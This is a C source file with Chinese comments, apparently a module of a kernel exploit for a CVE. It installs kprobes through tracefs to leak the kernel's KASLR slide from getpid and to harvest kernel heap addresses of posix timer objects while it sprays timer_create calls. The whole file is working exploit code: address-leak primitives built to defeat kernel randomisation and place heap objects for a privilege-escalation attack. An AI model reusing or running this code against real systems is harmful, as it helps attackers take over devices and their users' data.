/*
 * kprobe.c - nezha/popsicle 的 kprobe 读寄存器法
 *            （调用方按 KO_TIMER_ALLOC_PROBE_OFF != 0 决定是否使用）
 *
 * 与主路径（kmem_cache_alloc tracepoint 的 call_site/ptr）的区别：
 *   - 不解析 raw trace，而是往 kprobe_events 写一条动态插桩，直接抓寄存器。
 *   - slide 从 __arm64_sys_getpid 的 %pc 得到，与 do_timer_create 的内联无关。
 *   - timer 指针从 do_timer_create+<KO_TIMER_ALLOC_PROBE_OFF> 的 %x19 得到（alloc_posix_timer 被内联后，
 *     编译器把返回指针挪进了被调用者保存寄存器 x19）。
 *
 * 启用/清理严格对齐 nezha 的 probe_setup / probe_cleanup：
 *   - 用 rss_stat 的 enable_event 触发器软启用（避免 soft-mode 下直接写 enable 无效）；
 *   - 清理时移除触发器、触发 disable_event 清掉软启用、再删除 kprobe 事件；
 *   - 读 trace 时按线程 id（tid）过滤，避免混入其它进程/线程的记录。
 */

#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <time.h>
#include <unistd.h>

/* 必须先包含 kernel_offsets.h：KO_TIMER_ALLOC_PROBE_OFF 在这里定义 */
#include "kernel_offsets.h"

#include "kprobe.h"

#define TRACE_ROOT     "/sys/kernel/tracing"
#define KPROBE_EVENTS  TRACE_ROOT "/kprobe_events"
#define TRACE_TEXT     TRACE_ROOT "/trace"
#define TRACING_ON     TRACE_ROOT "/tracing_on"
#define RSS_ENABLE     TRACE_ROOT "/events/kmem/rss_stat/enable"
#define RSS_TRIGGER    TRACE_ROOT "/events/kmem/rss_stat/trigger"

static int write_file(const char *path, const char *text)
{
	int fd = open(path, O_WRONLY | O_CLOEXEC);
	ssize_t n;
	size_t len = strlen(text);
	if (fd < 0)
		return -1;
	n = write(fd, text, len);
	close(fd);
	return n == (ssize_t)len ? 0 : -1;
}

/* 追加写（触发器文件支持多个 trigger，必须 append） */
static int write_file_append(const char *path, const char *text)
{
	int fd = open(path, O_WRONLY | O_CLOEXEC | O_APPEND);
	ssize_t n;
	size_t len = strlen(text);
	if (fd < 0)
		return -1;
	n = write(fd, text, len);
	close(fd);
	return n == (ssize_t)len ? 0 : -1;
}

/* 生成本进程唯一的 group/event 名，避免与历史残留冲突 */
static void make_names(char *group, size_t gsz, char *event, size_t esz)
{
	struct timespec ts;
	clock_gettime(CLOCK_MONOTONIC, &ts);
	snprintf(group, gsz, "cve98260_%d", (int)getpid());
	snprintf(event, esz, "probe_%ld_%ld", ts.tv_sec, ts.tv_nsec);
}

/* 触发一次 rss_stat（nezha 的 trigger 软启用方式用） */
static void touch_rss(void)
{
	volatile unsigned char *p = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
					 MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (p != MAP_FAILED) {
		p[0] = 1;
		munmap((void *)p, 4096);
	}
}

/* 对齐 nezha probe_setup：写 kprobe 事件 + enable_event 触发器软启用 */
static int kprobe_enable(const char *group, const char *event,
			 const char *symbol, const char *fetch)
{
	char cmd[512];

	snprintf(cmd, sizeof(cmd), "p:%s/%s %s %s\n", group, event, symbol, fetch);
	if (write_file_append(KPROBE_EVENTS, cmd))
		return -1;

	snprintf(cmd, sizeof(cmd), "enable_event:%s:%s\n", group, event);
	if (write_file_append(RSS_TRIGGER, cmd))
		return -1;
	if (write_file(RSS_ENABLE, "1\n"))
		return -1;
	touch_rss();
	(void)write_file(RSS_ENABLE, "0\n");
	return 0;
}

/* 对齐 nezha probe_cleanup：移除触发器、触发 disable_event 清软启用、删事件 */
static void kprobe_disable(const char *group, const char *event)
{
	char cmd[256];

	snprintf(cmd, sizeof(cmd), "!enable_event:%s:%s\n", group, event);
	(void)write_file_append(RSS_TRIGGER, cmd);

	snprintf(cmd, sizeof(cmd), "disable_event:%s:%s\n", group, event);
	if (!write_file_append(RSS_TRIGGER, cmd)) {
		if (!write_file(RSS_ENABLE, "1\n")) {
			touch_rss();
			(void)write_file(RSS_ENABLE, "0\n");
		}
		snprintf(cmd, sizeof(cmd), "!disable_event:%s:%s\n", group, event);
		(void)write_file_append(RSS_TRIGGER, cmd);
	}

	snprintf(cmd, sizeof(cmd), "-:%s/%s\n", group, event);
	(void)write_file_append(KPROBE_EVENTS, cmd);
}

/* 从 trace 行解析线程 id（形如 "...-<tid>  [<cpu>]"）。失败返回 -1。 */
static long parse_tid(const char *line)
{
	const char *bracket = strchr(line, '[');
	const char *dash;
	char *end;
	long tid;

	if (!bracket)
		return -1;
	dash = bracket;
	while (dash > line && *dash != '-')
		dash--;
	if (*dash != '-')
		return -1;
	tid = strtol(dash + 1, &end, 10);
	if (end == dash + 1 || end > bracket)
		return -1;
	return tid;
}

/* 找 event 的记录，解析 field=0x...；tid < 0 表示不过滤线程。 */
static int kprobe_read_field(const char *event, const char *field, long tid,
			     uint64_t *out)
{
	FILE *f = fopen(TRACE_TEXT, "r");
	char line[1024];
	char event_key[64], field_key[64];

	if (!f)
		return -1;
	snprintf(event_key, sizeof(event_key), "%s:", event);
	snprintf(field_key, sizeof(field_key), "%s=0x", field);

	while (fgets(line, sizeof(line), f)) {
		char *ev = strstr(line, event_key);
		char *pos;
		unsigned long long v;

		if (!ev)
			continue;
		if (tid >= 0 && parse_tid(line) != tid)
			continue;
		pos = strstr(ev, field_key);
		if (!pos)
			continue;
		if (sscanf(pos + strlen(field_key), "%llx", &v) != 1) {
			fclose(f);
			return -1;
		}
		*out = (uint64_t)v;
		fclose(f);
		return 0;
	}
	fclose(f);
	return -1;
}

/* 同 kprobe_read_field，但收集所有匹配值（最多 cap 个）。 */
static int kprobe_read_field_all(const char *event, const char *field, long tid,
				 uint64_t *out, int cap, int *out_n)
{
	FILE *f = fopen(TRACE_TEXT, "r");
	char line[1024], event_key[64], field_key[64];
	int n = 0;

	*out_n = 0;
	if (!f)
		return -1;
	snprintf(event_key, sizeof(event_key), "%s:", event);
	snprintf(field_key, sizeof(field_key), "%s=0x", field);

	while (fgets(line, sizeof(line), f) && n < cap) {
		char *ev = strstr(line, event_key);
		char *pos;
		unsigned long long v;

		if (!ev)
			continue;
		if (tid >= 0 && parse_tid(line) != tid)
			continue;
		pos = strstr(ev, field_key);
		if (!pos)
			continue;
		if (sscanf(pos + strlen(field_key), "%llx", &v) != 1)
			continue;
		out[n++] = (uint64_t)v;
	}
	fclose(f);
	*out_n = n;
	return n > 0 ? 0 : -1;
}

int kprobe_measure_slide(uint64_t *slide_out)
{
	char group[64], event[64];
	uint64_t ip = 0;
	int rc = -1;

	if (!slide_out)
		return -1;
	make_names(group, sizeof(group), event, sizeof(event));
	(void)write_file(TRACING_ON, "0\n");

	if (kprobe_enable(group, event, KO_GETPID_PROBE, KO_GETPID_FETCH))
		goto out;
	(void)write_file(TRACING_ON, "1\n");

	/* 触发一次 getpid，让 kprobe 记录 %pc；slide 全局一致，不过滤线程 */
	(void)syscall(SYS_getpid);

	(void)write_file(TRACING_ON, "0\n");
	if (kprobe_read_field(event, "ip", -1, &ip))
		goto out;

	if (ip < KO_LINK_GETPID || ip - KO_LINK_GETPID >= UINT64_C(0x10000000000)) {
		fprintf(stderr, "[kprobe] bad ip=%#" PRIx64 " (link=%#" PRIx64 ")\n",
			ip, KO_LINK_GETPID);
		goto out;
	}
	*slide_out = ip - KO_LINK_GETPID;
	fprintf(stdout, "[kprobe] getpid ip=%#" PRIx64 " slide=%#" PRIx64 "\n",
		ip, *slide_out);
	rc = 0;

out:
	(void)kprobe_disable(group, event);
	return rc;
}

int kprobe_leak_timer_ptrs(uint64_t *ptrs, int max, int *out_n)
{
	char group[64], event[64], probe[64], fetch[64];
	struct sigevent sev;
	timer_t *ids = NULL;
	long tid;
	int made = 0;
	int rc = -1;

	if (!ptrs || !out_n || max <= 0)
		return -1;
	*out_n = 0;

	ids = calloc((size_t)max, sizeof(*ids));
	if (!ids)
		return -1;
	tid = (long)syscall(SYS_gettid);

	make_names(group, sizeof(group), event, sizeof(event));
	(void)write_file(TRACING_ON, "0\n");

	snprintf(probe, sizeof(probe), "%s%" PRIx64,
		 KO_TIMER_ALLOC_PROBE_NAME, (uint64_t)KO_TIMER_ALLOC_PROBE_OFF);
	snprintf(fetch, sizeof(fetch), "%s%" PRIu64 "%s",
		 KO_TIMER_ALLOC_FETCH_PREFIX, KO_TIMER_ALLOC_FETCH_REG,
		 KO_TIMER_ALLOC_FETCH_SUFFIX);
	if (kprobe_enable(group, event, probe, fetch))
		goto out;
	(void)write_file(TRACING_ON, "1\n");

	memset(&sev, 0, sizeof(sev));
	sev.sigev_notify = SIGEV_NONE;
	for (int i = 0; i < max; i++) {
		if (timer_create(CLOCK_THREAD_CPUTIME_ID, &sev, &ids[i]))
			break;
		made++;
	}
	fprintf(stdout, "[kprobe] created %d timers\n", made);

	(void)write_file(TRACING_ON, "0\n");
	if (kprobe_read_field_all(event, "timer", tid, ptrs, max, out_n)) {
		fprintf(stderr, "[kprobe] no timer= values read\n");
		goto out;
	}
	rc = 0;

out:
	for (int i = 0; i < made; i++)
		(void)timer_delete(ids[i]);
	free(ids);
	(void)kprobe_disable(group, event);
	return rc;
}

int kprobe_timer_probe_begin(struct kprobe_session *s)
{
	int fd;
	char probe[64], fetch[64];

	if (!s)
		return -1;
	memset(s, 0, sizeof(*s));
	make_names(s->group, sizeof(s->group), s->event, sizeof(s->event));

	(void)write_file(TRACING_ON, "0\n");
	snprintf(probe, sizeof(probe), "%s%" PRIx64,
		 KO_TIMER_ALLOC_PROBE_NAME, (uint64_t)KO_TIMER_ALLOC_PROBE_OFF);
	snprintf(fetch, sizeof(fetch), "%s%" PRIu64 "%s",
		 KO_TIMER_ALLOC_FETCH_PREFIX, KO_TIMER_ALLOC_FETCH_REG,
		 KO_TIMER_ALLOC_FETCH_SUFFIX);
	if (kprobe_enable(s->group, s->event, probe, fetch))
		return -1;

	/* 清空 trace，只保留之后这次 timer 创建 */
	fd = open(TRACE_TEXT, O_WRONLY | O_CLOEXEC | O_TRUNC);
	if (fd >= 0)
		close(fd);

	(void)write_file(TRACING_ON, "1\n");
	s->active = 1;
	return 0;
}

int kprobe_timer_probe_collect(struct kprobe_session *s, long tid,
			       uint64_t *ptrs, int max, int *out_n)
{
	int rc;

	if (!s || !s->active || !ptrs || !out_n || max <= 0)
		return -1;
	*out_n = 0;

	(void)write_file(TRACING_ON, "0\n");
	rc = kprobe_read_field_all(s->event, "timer", tid, ptrs, max, out_n);
	(void)kprobe_disable(s->group, s->event);
	s->active = 0;
	return rc;
}
